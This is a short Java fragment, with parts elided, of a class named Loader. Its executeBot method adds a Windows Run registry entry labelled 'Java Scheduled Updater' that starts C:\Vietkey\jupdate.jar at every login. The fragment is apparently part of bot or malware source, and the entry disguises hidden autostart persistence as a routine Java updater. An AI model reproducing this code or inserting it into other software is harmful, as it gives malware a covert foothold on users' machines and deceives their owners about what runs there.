...
public class Loader {
    ...
    public void executeBot() {
        try {
            ...
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater", "C:\\Vietkey\\jupdate.jar");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
